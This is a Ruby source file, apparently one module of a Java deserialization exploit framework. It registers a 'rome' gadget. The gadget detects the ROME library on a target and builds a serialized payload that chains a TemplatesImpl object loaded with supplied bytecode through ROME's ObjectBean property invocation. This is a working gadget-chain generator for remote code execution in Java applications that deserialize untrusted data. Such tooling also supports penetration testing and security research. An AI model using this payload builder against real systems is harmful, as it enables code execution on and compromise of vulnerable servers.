

require_relative '../payloads/rome'
require_relative '../payloads/templates'

class ROME < Java::Gadgets::Gadget
  def id
    'rome'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('rome')

    unless params.fetch('classfiles', nil).nil?
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    ['bytecode']
  end

  def create(ctx, params: {})
    ctx.reg.load('model/rome.json')

    legacy = false
    tplcls = 'javax.xml.transform.Templates'
    if ctx.flag?('rometools') ||
       ctx.class?('com.rometools.rome.feed.impl.ObjectBean')
      legacy = false
    elsif ctx.class?('com.sun.syndication.feed.impl.ObjectBean')
      legacy = true
    else
      raise 'Incompatible'
    end

    if !params.fetch('classfiles', nil).nil?
      tpl = Java::Serialize::Payloads::Templates.make_jdk(params['classfiles'])
      Java::Serialize::Payloads::ROME.make_properties_invoke(tpl, tplcls, legacy: legacy)
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  ROME.new
)
